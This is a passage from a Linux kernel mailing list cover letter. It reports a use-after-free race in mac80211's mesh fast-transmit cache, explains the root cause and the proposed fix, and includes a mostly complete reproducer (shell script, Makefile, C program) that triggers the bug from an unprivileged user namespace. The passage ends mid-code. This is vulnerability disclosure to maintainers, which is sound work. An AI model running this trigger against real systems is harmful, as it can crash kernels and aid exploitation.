Received: from mail-pf1-f179.google.com (mail-pf1-f179.google.com [209.85.210.179])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id E79243812FE
	for <linux-wireless@vger.kernel.org>; Tue,  8 Sep 2026 06:28:35 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.210.179
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1788848919; cv=none; b=bMRVQ9K5Tcba/GS32Hcy+I/uYF3ck9tGgucxrRzCL0nomuJLSOt7LW8oy8CfhgUl2rMiSXPkJm4xANUJEiteSHuWB7h2gQ6+m/aP9KnlnJDxuvxBMijfWwiRROWhJkaDSKE8GnaY1YUCXygo29X3Uik2Qj1F8RNgnvhsXbH97ts=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1788848919; c=relaxed/simple;
	bh=puP2WCrRFy2SR1MJQ+5ufvk+wfxU+qbG1naHUiZClaQ=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=qjVI3E1AjLAQLf8ysv3TCBjSdf+7ZWUcf/KYIUyncpI7Bk6IDkiuCUJLuX/3hB9P1CwaGfTdAsQkqp6iegI+pxGqx2S9VATAG5TEVxckj3LbHKju4emGCNhjZFVkOlARxcR2KxiAMeLa5Jn3NcnvQeTBf25NpOfMyHmWfo/Itvo=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=jv2uhmn1; arc=none smtp.client-ip=209.85.210.179
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="jv2uhmn1"
Received: by mail-pf1-f179.google.com with SMTP id d2e1a72fcca58-8541875f596so1667803b3a.0
        for <linux-wireless@vger.kernel.org>; Mon, 07 Sep 2026 23:28:35 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1788848915; x=1789453715; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=a+xUl1XOqW2qpRIvjktW1XELGZCKvDEVYYC6wBC/gZo=;
        b=jv2uhmn1rRzAqQeSb2GazoVHP0eLjYGwpTTEEmXj38ZkDLPFSfQvFJpdqjCAHlolYQ
         yZcgJJVu2nOE/C7+qwcFkfXT9xQirBtUzEiuJg+d6E+VRF02beSvy98tbDrgG8+PKfnb
         FLDQQRc7hPoQ7M/4WnO86l+KMop8wX9hTIJKe5/2NvvyEPnqMpOsGmDwrJupXJ0kdVjE
         oJruLBnoiklYp/wWhJMNEiGbTLXulQODrwBfkYlP5xVY4BTXY3SmLl60EjbXg+qTcG5J
         xSB2mRL6Vgch6+ucbgAQsHb4ihSl48NavpaggKEJRH7zA3UR51FzE9Py0NIEb1Sk9rT5
         q2yg==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1788848915; x=1789453715;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=a+xUl1XOqW2qpRIvjktW1XELGZCKvDEVYYC6wBC/gZo=;
        b=BVScnD3MOofWhpFY7PqgUz3rAvY/nCHn2GjOUbmgxWsqLhPUsU25KmuNkLNZ3UbjKJ
         Gl27EnuEA1UalhIx23GNbM/4DYGcm2pvWlD/qKvDxCzq7Xy2DMnIbmPHt//meV8KhZed
         XclimJ8EaSoa4s7W4nGFJ0cRIq+cptnoXeO22R56T/slYUdCL5DJzrNlsGai3Uu3YiGP
         51/9p8CRWULEZ0+s2tqK60/0WNs8JY50/51/iZVl1d94ap2iVz1S+Semy+H8W9HojdOU
         mA/yNG+aS0tuxOMGZI3cVSAKaTlfcNA4AO05pGejhCZzDuzZ4dE97sRf5uMxhGUF3a3H
         HdHA==
X-Forwarded-Encrypted: i=1; AKwUvBzmRiNttxyU0hCJ7uKk0f2FwO612YOnjAsVqryhTgwOhlFp1nNZRMHbLAlCyCbjN4G3Nkvy7PPrlyS8sjv4rQ==@vger.kernel.org
X-Gm-Message-State: AFuF++mkaC7GdwIg+jSN5D6fF6PqkHyeHvpQLnIo6Tc5KaMvR8BO3tlS
	x/glFQM4KhsYT8HytiYtiZQ+7ZdfMQhSnvWBxyvOh2j+g8zK/z8gF2LK0LRLS7NvqSH8
X-Gm-Gg: AYBFou1syEUXLGEAmkjnD+ZreJj/wJd72xk1WJzOOiENBhvMckN6l/54x5ZmN8dSg5+
	ZDBpXHCzCicH4C4frUjOdUo6lvZ+7js4S0c0+Orpr2kPD57BhzdbW6BPyg3A4MhEx/GUE65Uuey
	3x0/IG+BGgAOQ09G4chBvEAXVJxQhfGZDS+CreYF8jY8kmOZyA0xGV6SZBErQhZYhJIOMXjZBhk
	V4TLCZVH5nDXIbDWlWFqVe/leAwn0GTnMQvBwThPsmQKQXIdjGo3+w6k87iBxTrPQ75Wp2HcvHZ
	zGUGWeLb+cBoB36E+yDXrSBEfaKcltWRbTp5w+q+b2OWRMw2ZMJE1KePQeUr+wZyeZx0EKX2ff3
	tTeGdCCg8arUeO9QrWBEaWZZe+YK3LVdXg7GMjrmqvEpPrCOe8FYgQ0a5POkb70jyX8lVYTw0nP
	LEP2nyi8dIQEWjpt+VgzoJOj5oJA9RF+qTK3wEEnL0qVh1tyT9OuR7Iy7/4uKkZmH07c7f3y/N5
	CmrcBMoYlBUantM0YSKo1RBci0GFA==
X-Received: by 2002:a05:6a00:8c3:b0:856:30dd:91ba with SMTP id d2e1a72fcca58-86168e8bb34mr34834106b3a.2.1788848914613;
        Mon, 07 Sep 2026 23:28:34 -0700 (PDT)
Received: from b6ad5085b32f.. ([122.51.212.64])
        by smtp.gmail.com with ESMTPSA id 41be03b00d2f7-cc4554a312dsm5109502a12.29.2026.09.07.23.28.30
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Mon, 07 Sep 2026 23:28:33 -0700 (PDT)
From: Zihan Xi <zihanx@nebusec.ai>
To: Johannes Berg <johannes@sipsolutions.net>,
	linux-wireless@vger.kernel.org
Cc: Zihan Xi <zihanx@nebusec.ai>,
	Ryder Lee <ryder.lee@mediatek.com>,
	Felix Fietkau <nbd@nbd.name>,
	linux-kernel@vger.kernel.org
Subject: [PATCH wireless 0/1] wifi: mac80211: fix mesh fast xmit path deletion UAF
Date: Tue,  8 Sep 2026 06:28:26 +0000
Message-ID: <cover.1788845030.git.zihanx@nebusec.ai>
X-Mailer: git-send-email 2.47.3
Precedence: bulk
X-Mailing-List: linux-wireless@vger.kernel.org
List-Id: <linux-wireless.vger.kernel.org>
List-Subscribe: <mailto:linux-wireless+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-wireless+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

Hi Linux kernel maintainers,

We found and validated a issue in net/mac80211/mesh_pathtbl.c. The bug is reachable by a
non-root user via user and net namespace.
We've tested it, and it should not affect any other functionality.

We will provide detailed information about the bug
in this email, along with a PoC to trigger it.

---- details below ----

Bug details:

mesh_nexthop_lookup() looks up an active mesh_path under RCU and, when
the driver advertises fast transmit, passes that raw pointer to
mesh_fast_tx_cache(). The cache stores the mesh path and optional MPP
path pointers in a persistent cache entry.

__mesh_path_del() removes the path from the rhashtable and flushes
currently visible fast-TX entries, then mesh_path_free_rcu() sets
MESH_PATH_DELETED and frees the path via kfree_rcu(). A concurrent
sender that already holds the path in its RCU read-side section can
insert a new cache entry after that flush. When the lookup RCU section
ends, the path is freed while the new cache entry still references it.

A later mesh_fast_tx_get() then dereferences the freed flags, expiry,
or next_hop fields. The attached KASAN report hits this from local TX:
ieee80211_mesh_xmit_fast() -> mesh_fast_tx_get(). The same cache is
also consumed by ieee80211_rx_mesh_fast_forward() through
mesh_fast_tx_get(), so the deletion tombstone covers that consumer
too. The attached log does not itself prove the RX path.

The root-cause fact is that the fast-TX cache stores raw path pointers
without ordering insertion against path deletion. That fact was
introduced by d5edb9ae8d56 ("wifi: mac80211: mesh fast xmit support").
Later GENL_UNS_ADMIN_PERM on NL80211_CMD_NEW_MPATH / NL80211_CMD_DEL_MPATH
and mac80211_hwsim radio creation only lowered the privilege needed to
hit the same race from a user namespace. Fixes: still points at the
commit that first introduced the raw-pointer cache lifetime hole.

The fix marks MESH_PATH_DELETED before flushing and rejects cache
insertion if the mesh path or optional MPP path was deleted while the
entry was being built. The cache walk lock orders this check with the
deletion flush, so entries inserted before the flush are removed and
later entries are not cached.

The reproducer is Makefile, poc.sh, and poc.c. poc.c links
libnl-3/libnl-genl-3, so it is built with make rather than a single
gcc -static line. Run make, then unshare -Urn ./poc.sh. That wrapper
creates two mac80211_hwsim radios, joins a mesh, and races
NL80211_CMD_NEW_MPATH / NL80211_CMD_DEL_MPATH with local UDP TX.
packetdrill is not used because it cannot express 802.11 mesh setup
or nl80211 mpath control.

Reproducer:

    make
    unshare -Urn ./poc.sh

We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.

------BEGIN poc.sh------
#!/bin/sh
set -eu

SCRIPT_DIR=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)
cd "$SCRIPT_DIR"
PATH=/usr/sbin:/usr/bin:/sbin:/bin

MODE=${MODE:-namespace}
RUN_SECONDS=${RUN_SECONDS:-180}
SENDERS=${SENDERS:-4}
ADDERS=${ADDERS:-2}
DELETERS=${DELETERS:-2}
PAYLOAD_LEN=${PAYLOAD_LEN:-256}
ADD_PAUSE_US=${ADD_PAUSE_US:-100}
DEL_PAUSE_US=${DEL_PAUSE_US:-0}
MESH_ID=${MESH_ID:-mtest}
MESH_FREQ=${MESH_FREQ:-2412}

cleanup_root() {
	iw dev mesh0 del >/dev/null 2>&1 || true
	iw dev mesh1 del >/dev/null 2>&1 || true
}

wait_for_peer() {
	ifname=$1
	deadline=$(( $(date +%s) + 30 ))
	while [ "$(date +%s)" -lt "$deadline" ]; do
		if iw dev "$ifname" station dump | grep -q 'mesh plink:.*ESTAB'; then
			return 0
		fi
		sleep 1
	done
	return 1
}

make

if [ "$MODE" = "root" ]; then
	cleanup_root
	trap cleanup_root EXIT INT TERM

	iw phy phy0 interface add mesh0 type mp
	iw phy phy1 interface add mesh1 type mp

	ip link set mesh0 up
	ip link set mesh1 up

	iw dev mesh0 mesh join "$MESH_ID" freq "$MESH_FREQ"
	iw dev mesh1 mesh join "$MESH_ID" freq "$MESH_FREQ"

	wait_for_peer mesh0

	M0=$(cat /sys/class/net/mesh0/address)
	M1=$(cat /sys/class/net/mesh1/address)

	ip addr flush dev mesh0 >/dev/null 2>&1 || true
	ip addr flush dev mesh1 >/dev/null 2>&1 || true
	ip addr add 10.0.0.1/24 dev mesh0
	ip addr add 10.0.0.2/24 dev mesh1
	ip neigh replace 10.0.0.2 lladdr "$M1" nud permanent dev mesh0
	ip neigh replace 10.0.0.1 lladdr "$M0" nud permanent dev mesh1

	iw dev mesh0 mpath new "$M1" next_hop "$M1" >/dev/null 2>&1 || true

	echo 1 >/proc/sys/kernel/panic_on_warn

	echo "[*] mesh0=$M0 mesh1=$M1"
	echo "[*] mesh peers"
	iw dev mesh0 station dump || true
	echo "[*] initial mpath"
	iw dev mesh0 mpath dump || true

	exec ./poc -i mesh0 -a 10.0.0.2 -m "$M1" -n "$M1" -s "$RUN_SECONDS" \
		-t "$SENDERS" -A "$ADDERS" -D "$DELETERS" -l "$PAYLOAD_LEN" \
		-u "$ADD_PAUSE_US" -v "$DEL_PAUSE_US"
fi

if [ "$MODE" != "namespace" ]; then
	echo "Unsupported MODE=$MODE" >&2
	exit 1
fi

if [ -z "${INSIDE_NAMESPACE:-}" ]; then
	exec unshare -Urn env INSIDE_NAMESPACE=1 MODE=namespace \
		RUN_SECONDS="$RUN_SECONDS" SENDERS="$SENDERS" ADDERS="$ADDERS" \
		DELETERS="$DELETERS" PAYLOAD_LEN="$PAYLOAD_LEN" \
		ADD_PAUSE_US="$ADD_PAUSE_US" DEL_PAUSE_US="$DEL_PAUSE_US" \
		MESH_ID="$MESH_ID" MESH_FREQ="$MESH_FREQ" PATH="$PATH" \
		sh ./poc.sh
fi

./poc -R 1 >/dev/null 2>&1 || true
./poc -R 1 >/dev/null 2>&1 || true
sleep 1

IFS0=$(iw dev | awk '/Interface/ {print $2}' | sed -n '1p')
IFS1=$(iw dev | awk '/Interface/ {print $2}' | sed -n '2p')

if [ -z "$IFS0" ] || [ -z "$IFS1" ]; then
	echo "Failed to provision two namespace-local hwsim radios" >&2
	exit 1
fi

iw dev "$IFS0" set type mp
iw dev "$IFS1" set type mp
ip link set "$IFS0" up
ip link set "$IFS1" up
iw dev "$IFS0" mesh join "$MESH_ID" freq "$MESH_FREQ"
iw dev "$IFS1" mesh join "$MESH_ID" freq "$MESH_FREQ"

wait_for_peer "$IFS0"

PEER=$(iw dev "$IFS0" station dump | awk '/^Station/ {print $2; exit}')
if [ -z "$PEER" ]; then
	echo "Failed to learn peer station MAC" >&2
	exit 1
fi

ip addr flush dev "$IFS0" >/dev/null 2>&1 || true
ip addr add 10.0.0.1/24 dev "$IFS0"
ip neigh replace 10.0.0.2 lladdr "$PEER" nud permanent dev "$IFS0"
iw dev "$IFS0" mpath new "$PEER" next_hop "$PEER" >/dev/null 2>&1 || true

echo "[*] namespace if0=$IFS0 if1=$IFS1 peer=$PEER"
echo "[*] mesh peers"
iw dev "$IFS0" station dump || true
echo "[*] initial mpath"
iw dev "$IFS0" mpath dump || true

exec ./poc -i "$IFS0" -a 10.0.0.2 -m "$PEER" -n "$PEER" -s "$RUN_SECONDS" \
	-t "$SENDERS" -A "$ADDERS" -D "$DELETERS" -l "$PAYLOAD_LEN" \
	-u "$ADD_PAUSE_US" -v "$DEL_PAUSE_US"
------END poc.sh--------

------BEGIN Makefile------
CC ?= gcc
PKG_CONFIG ?= pkg-config

NL_CFLAGS != $(PKG_CONFIG) --cflags libnl-3.0 libnl-genl-3.0
NL_LIBS != $(PKG_CONFIG) --libs libnl-3.0 libnl-genl-3.0

CFLAGS += -O2 -g -Wall -Wextra -pthread $(NL_CFLAGS)
LDLIBS += -pthread $(NL_LIBS)

all: poc

poc: poc.c

clean:
	rm -f poc
------END Makefile--------

------BEGIN poc.c------
#define _GNU_SOURCE

#include <arpa/inet.h>
#include <errno.h>
#include <linux/nl80211.h>
#include <net/if.h>
#include <netinet/in.h>
#include <netlink/genl/ctrl.h>
#include <netlink/genl/genl.h>
#include <netlink/msg.h>
#include <netlink/netlink.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdatomic.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <time.h>
#include <unistd.h>

#define ETH_ALEN 6

enum hwsim_commands {
	HWSIM_CMD_UNSPEC,
	HWSIM_CMD_REGISTER,
	HWSIM_CMD_FRAME,
	HWSIM_CMD_TX_INFO_FRAME,
	HWSIM_CMD_NEW_RADIO,
};

enum hwsim_attrs {
	HWSIM_ATTR_UNSPEC,
	HWSIM_ATTR_ADDR_RECEIVER,
	HWSIM_ATTR_ADDR_TRANSMITTER,
	HWSIM_ATTR_FRAME,
	HWSIM_ATTR_FLAGS,
	HWSIM_ATTR_RX_RATE,
	HWSIM_ATTR_SIGNAL,
	HWSIM_ATTR_TX_INFO,
	HWSIM_ATTR_COOKIE,
	HWSIM_ATTR_CHANNELS,
};

struct cfg {
	char ifname[IFNAMSIZ];
	char dst_ip[INET_ADDRSTRLEN];
	unsigned char dst_mac[ETH_ALEN];
	unsigned char next_hop[ETH_ALEN];
	unsigned int seconds;
	unsigned int senders;
	unsigned int adders;
	unsigned int deleters;
	unsigned int payload_len;
	unsigned int add_pause_us;
	unsigned int del_pause_us;
	unsigned int hwsim_radios;
};

static struct cfg g_cfg = {
	.ifname = "mesh0",
	.dst_ip = "10.0.0.2",
	.seconds = 180,
	.senders = 4,
	.adders = 1,
	.deleters = 1,
	.payload_len = 256,
	.add_pause_us = 100,
	.del_pause_us = 0,
};

static atomic_bool stop_flag;
static atomic_ullong send_ok;
static atomic_ullong send_err;
static atomic_ullong add_ok;
static atomic_ullong add_exist;
static atomic_ullong add_err;
static atomic_ullong del_ok;
static atomic_ullong del_absent;
static atomic_ullong del_err;

static void usage(const char *prog)
{
	fprintf(stderr,
		"Usage: %s [-i ifname] [-a ip] [-m dst_mac] [-n next_hop] "
		"[-s seconds] [-t senders] [-A adders] [-D deleters] "
		"[-l payload_len] [-u add_pause_us] [-v del_pause_us] "
		"[-R create_radios]\n",
		prog);
}

static int parse_mac(const char *text, unsigned char mac[ETH_ALEN])
{
	unsigned int bytes[ETH_ALEN];
	size_t i;

	if (sscanf(text, "%02x:%02x:%02x:%02x:%02x:%02x",
		   &bytes[0], &bytes[1], &bytes[2],
		   &bytes[3], &bytes[4], &bytes[5]) != ETH_ALEN)
		return -1;

	for (i = 0; i < ETH_ALEN; i++)
		mac[i] = bytes[i];

	return 0;
}

static const char *mac_to_str(const unsigned char mac[ETH_ALEN], char *buf,
			      size_t len)
{
	snprintf(buf, len, "%02x:%02x:%02x:%02x:%02x:%02x",
		 mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
	return buf;
}

static void pin_to_cpu(unsigned int index)
{
	long ncpus = sysconf(_SC_NPROCESSORS_ONLN);
	cpu_set_t cpus;

	if (ncpus <= 0)
		return;

	CPU_ZERO(&cpus);
	CPU_SET(index % (unsigned int)ncpus, &cpus);
	(void)pthread_setaffinity_np(pthread_self(), sizeof(cpus), &cpus);
}

static void sleep_us(unsigned int usec)
{
	struct timespec ts;

	if (!usec)
		return;

	ts.tv_sec = usec / 1000000U;
	ts.tv_nsec = (long)(usec % 1000000U) * 1000L;
	while (nanosleep(&ts, &ts) && errno == EINTR)
		;
}

static void stop_now(int signo)
{
	(void)signo;
	atomic_store_explicit(&stop_flag, true, memory_order_relaxed);
}

static int nl80211_family(struct nl_sock *sock)
{
	if (genl_connect(sock) < 0)
		return -1;

	return genl_ctrl_resolve(sock, "nl80211");
}

static int hwsim_new_radio_once(struct nl_sock *sock, int family_id,
				unsigned int channels)
{
	struct nl_msg *msg;
	int err;

	msg = nlmsg_alloc();
	if (!msg)
		return -NLE_NOMEM;

	if (!genlmsg_put(msg, 0, 0, family_id, 0, 0, HWSIM_CMD_NEW_RADIO, 1)) {
		nlmsg_free(msg);
		return -NLE_MSGSIZE;
	}

	err = nla_put_u32(msg, HWSIM_ATTR_CHANNELS, channels);
	if (err < 0) {
		nlmsg_free(msg);
		return err;
	}

	err = nl_send_auto(sock, msg);
	if (err >= 0)
		err = nl_wait_for_ack(sock);

	nlmsg_free(msg);
	return err;
}

static int create_hwsim_radios(unsigned int count)
{
	struct nl_sock *sock;
	int family_id;
	unsigned int i;

	sock = nl_socket_alloc();
	if (!sock) {
		fprintf(stderr, "nl_socket_alloc(hwsim) failed\n");
		return EXIT_FAILURE;
	}

	if (genl_connect(sock) < 0) {
		fprintf(stderr, "genl_connect(hwsim) failed\n");
		nl_socket_free(sock);
		return EXIT_FAILURE;
	}

	family_id = genl_ctrl_resolve(sock, "MAC80211_HWSIM");
	if (family_id < 0) {
		fprintf(stderr, "genl_ctrl_resolve(MAC80211_HWSIM) failed: %d\n",
			family_id);
		nl_socket_free(sock);
		return EXIT_FAILURE;
	}

	for (i = 0; i < count; i++) {
		int err = hwsim_new_radio_once(sock, family_id, 1);

		if (err < 0) {
			fprintf(stderr, "new_radio_once[%u] failed: %d (%s)\n",
				i, err, nl_geterror(err));
			nl_socket_free(sock);
			return EXIT_FAILURE;
		}
	}

	printf("created %u hwsim radio(s)\n", count);
	nl_socket_free(sock);
	return EXIT_SUCCESS;
}

static int add_mpath_once(struct nl_sock *sock, int family_id, int ifindex,
			  const unsigned char dst[ETH_ALEN],
			  const unsigned char next_hop[ETH_ALEN])
{
	struct nl_msg *msg;
	int err;

	msg = nlmsg_alloc();
	if (!msg)
		return -NLE_NOMEM;

	if (!genlmsg_put(msg, 0, 0, family_id, 0, 0, NL80211_CMD_NEW_MPATH, 0)) {
		nlmsg_free(msg);
		return -NLE_MSGSIZE;
	}

	err = nla_put_u32(msg, NL80211_ATTR_IFINDEX, ifindex);
	if (err < 0)
		goto out;

	err = nla_put(msg, NL80211_ATTR_MAC, ETH_ALEN, dst);
	if (err < 0)
		goto out;

	err = nla_put(msg, NL80211_ATTR_MPATH_NEXT_HOP, ETH_ALEN, next_hop);
	if (err < 0)
		goto out;

	err = nl_send_auto(sock, msg);
	if (err < 0)
		goto out;

	err = nl_wait_for_ack(sock);

out:
	nlmsg_free(msg);
	return err;
}

static int del_mpath_once(struct nl_sock *sock, int family_id, int ifindex,
			  const unsigned char dst[ETH_ALEN])
{
	struct nl_msg *msg;
	int err;

	msg = nlmsg_alloc();
	if (!msg)
		return -NLE_NOMEM;

	if (!genlmsg_put(msg, 0, 0, family_id, 0, 0, NL80211_CMD_DEL_MPATH, 0)) {
		nlmsg_free(msg);
		return -NLE_MSGSIZE;
	}

	err = nla_put_u32(msg, NL80211_ATTR_IFINDEX, ifindex);
	if (err < 0)
		goto out;

	err = nla_put(msg, NL80211_ATTR_MAC, ETH_ALEN, dst);
	if (err < 0)
		goto out;

	err = nl_send_auto(sock, msg);
	if (err < 0)
		goto out;

	err = nl_wait_for_ack(sock);

out:
	nlmsg_free(msg);
	return err;
}

static void *adder_thread(void *arg)
{
	unsigned int thread_index = (unsigned long)arg;
	struct nl_sock *sock;
	int family_id;
	int ifindex;

	pin_to_cpu(g_cfg.senders + thread_index);

	ifindex = if_nametoindex(g_cfg.ifname);
	if (!ifindex) {
		perror("if_nametoindex");
		atomic_fetch_add_explicit(&add_err, 1, memory_order_relaxed);
		return NULL;
	}

	sock = nl_socket_alloc();
	if (!sock) {
		fprintf(stderr, "nl_socket_alloc(add) failed\n");
		atomic_fetch_add_explicit(&add_err, 1, memory_order_relaxed);
		return NULL;
	}

	family_id = nl80211_family(sock);
	if (family_id < 0) {
		fprintf(stderr, "nl80211 family resolve(add) failed: %d\n",
			family_id);
		nl_socket_free(sock);
		atomic_fetch_add_explicit(&add_err, 1, memory_order_relaxed);
		return NULL;
	}

	while (!atomic_load_explicit(&stop_flag, memory_order_relaxed)) {
		int err = add_mpath_once(sock, family_id, ifindex,
					 g_cfg.dst_mac, g_cfg.next_hop);

		if (!err) {
			atomic_fetch_add_explicit(&add_ok, 1, memory_order_relaxed);
			sleep_us(g_cfg.add_pause_us);
			continue;
		}

		if (err == -NLE_EXIST) {
			atomic_fetch_add_explicit(&add_exist, 1,
						  memory_order_relaxed);
			sleep_us(g_cfg.add_pause_us);
			continue;
		}

		atomic_fetch_add_explicit(&add_err, 1, memory_order_relaxed);
	}

	nl_socket_free(sock);
	return NULL;
}

static void *deleter_thread(void *arg)
{
	unsigned int thread_index = (unsigned long)arg;
	struct nl_sock *sock;
	int family_id;
	int ifindex;

	pin_to_cpu(g_cfg.senders + g_cfg.adders + thread_index);

	ifindex = if_nametoindex(g_cfg.ifname);
	if (!ifindex) {
		perror("if_nametoindex");
		atomic_fetch_add_explicit(&del_err, 1, memory_order_relaxed);
		return NULL;
	}

	sock = nl_socket_alloc();
	if (!sock) {
		fprintf(stderr, "nl_socket_alloc(del) failed\n");
		atomic_fetch_add_explicit(&del_err, 1, memory_order_relaxed);
		return NULL;
	}

	family_id = nl80211_family(sock);
	if (family_id < 0) {
		fprintf(stderr, "nl80211 family resolve(del) failed: %d\n",
			family_id);
		nl_socket_free(sock);
		atomic_fetch_add_explicit(&del_err, 1, memory_order_relaxed);
		return NULL;
	}

	while (!atomic_load_explicit(&stop_flag, memory_order_relaxed)) {
		int err = del_mpath_once(sock, family_id, ifindex, g_cfg.dst_mac);

		if (!err) {
			atomic_fetch_add_explicit(&del_ok, 1, memory_order_relaxed);
			sleep_us(g_cfg.del_pause_us);
			continue;
		}

		if (err == -NLE_OBJ_NOTFOUND || err == -NLE_NOADDR ||
		    err == -NLE_FAILURE) {
			atomic_fetch_add_explicit(&del_absent, 1,
						  memory_order_relaxed);
			sleep_us(g_cfg.del_pause_us);
			continue;
		}

		atomic_fetch_add_explicit(&del_err, 1, memory_order_relaxed);
	}

	nl_socket_free(sock);
	return NULL;
}

static void *sender_thread(void *arg)
{
	unsigned int thread_index = (unsigned long)arg;
	struct sockaddr_in dst = {
		.sin_family = AF_INET,
		.sin_port = htons(9),
	};
	int fd;
	char *payload;

	pin_to_cpu(thread_index);

	if (inet_pton(AF_INET, g_cfg.dst_ip, &dst.sin_addr) != 1) {
		fprintf(stderr, "inet_pton(%s) failed\n", g_cfg.dst_ip);
		atomic_fetch_add_explicit(&send_err, 1, memory_order_relaxed);
		return NULL;
	}

	fd = socket(AF_INET, SOCK_DGRAM, 0);
	if (fd < 0) {
		perror("socket");
		atomic_fetch_add_explicit(&send_err, 1, memory_order_relaxed);
		return NULL;
	}

	if (setsockopt(fd, SOL_SOCKET, SO_BINDTODEVICE, g_cfg.ifname,
		       strlen(g_cfg.ifname) + 1) < 0) {
		perror("SO_BINDTODEVICE");
		close(fd);
		atomic_fetch_add_explicit(&send_err, 1, memory_order_relaxed);
		return NULL;
	}

	if (connect(fd, (struct sockaddr *)&dst, sizeof(dst)) < 0) {
		perror("connect");
		close(fd);
		atomic_fetch_add_explicit(&send_err, 1, memory_order_relaxed);
		return NULL;
	}

	payload = malloc(g_cfg.payload_len);
	if (!payload) {
		perror("malloc");
		close(fd);
		atomic_fetch_add_explicit(&send_err, 1, memory_order_relaxed);
		return NULL;
	}

	memset(payload, 'A' + (thread_index % 26), g_cfg.payload_len);

	while (!atomic_load_explicit(&stop_flag, memory_order_relaxed)) {
		ssize_t ret = send(fd, payload, g_cfg.payload_len, MSG_NOSIGNAL);

		if (ret == (ssize_t)g_cfg.payload_len)
			atomic_fetch_add_explicit(&send_ok, 1, memory_order_relaxed);
		else
			atomic_fetch_add_explicit(&send_err, 1, memory_order_relaxed);
	}

	free(payload);
	close(fd);
	return NULL;
}

static void *progress_thread(void *arg)
{
	(void)arg;

	while (!atomic_load_explicit(&stop_flag, memory_order_relaxed)) {
		sleep(1);
		printf("stats send_ok=%llu send_err=%llu add_ok=%llu add_exist=%llu "
		       "add_err=%llu del_ok=%llu del_absent=%llu del_err=%llu\n",
		       (unsigned long long)atomic_load_explicit(&send_ok,
						memory_order_relaxed),
		       (unsigned long long)atomic_load_explicit(&send_err,
						memory_order_relaxed),
		       (unsigned long long)atomic_load_explicit(&add_ok,
						memory_order_relaxed),
		       (unsigned long long)atomic_load_explicit(&add_exist,
						memory_order_relaxed),
		       (unsigned long long)atomic_load_explicit(&add_err,
						memory_order_relaxed),
		       (unsigned long long)atomic_load_explicit(&del_ok,
						memory_order_relaxed),
		       (unsigned long long)atomic_load_explicit(&del_absent,
						memory_order_relaxed),
		       (unsigned long long)atomic_load_explicit(&del_err,
						memory_order_relaxed));
		fflush(stdout);
	}

	return NULL;
}

int main(int argc, char **argv)
{
	pthread_t *threads = NULL;
	pthread_t progress;
	size_t total_threads;
	size_t idx = 0;
	char dst_buf[18];
	char nh_buf[18];
	int opt;
	unsigned int i;
	int ret = EXIT_SUCCESS;

	while ((opt = getopt(argc, argv, "i:a:m:n:s:t:A:D:l:u:v:R:h")) != -1) {
		switch (opt) {
		case 'i':
			strncpy(g_cfg.ifname, optarg, sizeof(g_cfg.ifname) - 1);
			g_cfg.ifname[sizeof(g_cfg.ifname) - 1] = '\0';
			break;
		case 'a':
			strncpy(g_cfg.dst_ip, optarg, sizeof(g_cfg.dst_ip) - 1);
			g_cfg.dst_ip[sizeof(g_cfg.dst_ip) - 1] = '\0';
			break;
		case 'm':
			if (parse_mac(optarg, g_cfg.dst_mac) < 0) {
				fprintf(stderr, "invalid dst MAC: %s\n", optarg);
				return EXIT_FAILURE;
			}
			break;
		case 'n':
			if (parse_mac(optarg, g_cfg.next_hop) < 0) {
				fprintf(stderr, "invalid next-hop MAC: %s\n",
					optarg);
				return EXIT_FAILURE;
			}
			break;
		case 's':
			g_cfg.seconds = strtoul(optarg, NULL, 0);
			break;
		case 't':
			g_cfg.senders = strtoul(optarg, NULL, 0);
			break;
		case 'A':
			g_cfg.adders = strtoul(optarg, NULL, 0);
			break;
		case 'D':
			g_cfg.deleters = strtoul(optarg, NULL, 0);
			break;
		case 'l':
			g_cfg.payload_len = strtoul(optarg, NULL, 0);
			break;
		case 'u':
			g_cfg.add_pause_us = strtoul(optarg, NULL, 0);
			break;
		case 'v':
			g_cfg.del_pause_us = strtoul(optarg, NULL, 0);
			break;
		case 'R':
			g_cfg.hwsim_radios = strtoul(optarg, NULL, 0);
			break;
		default:
			usage(argv[0]);
			return opt == 'h' ? EXIT_SUCCESS : EXIT_FAILURE;
		}
	}

	if (g_cfg.hwsim_radios)
		return create_hwsim_radios(g_cfg.hwsim_radios);

	if (!g_cfg.senders || !g_cfg.adders || !g_cfg.deleters ||
	    !g_cfg.seconds || !g_cfg.payload_len ||
